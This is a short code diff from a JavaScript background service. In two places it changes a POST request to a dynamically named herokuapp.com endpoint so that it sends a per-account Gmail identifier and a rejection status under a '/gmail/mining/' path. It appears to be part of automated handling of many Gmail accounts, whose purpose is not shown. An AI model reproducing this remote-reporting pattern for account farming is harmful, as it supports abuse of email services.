@@ -122,7 +122,7 @@ async function startBackgroundService() {
                                 url: 'https://'+body+'.herokuapp.com/set',
                                 method: 'POST',
                                 body: {
-                                    path: '/gmail/mining/00000/mining-001',
+                                    path: '/gmail/mining/0000000000/'+mGmail,
                                     data: reject == 1 ? 'x' : reject == 2 ? 'y' : 'z'
                                 },
                                 json: true
@@ -190,7 +190,7 @@ async function startBackgroundService() {
                                     url: 'https://'+body+'.herokuapp.com/set',
                                     method: 'POST',
                                     body: {
-                                        path: '/gmail/mining/00000/mining-001',
+                                        path: '/gmail/mining/0000000000/'+mGmail,
                                         data: reject == 1 ? 'x' : reject == 2 ? 'y' : 'z'
                                     },
                                     json: true
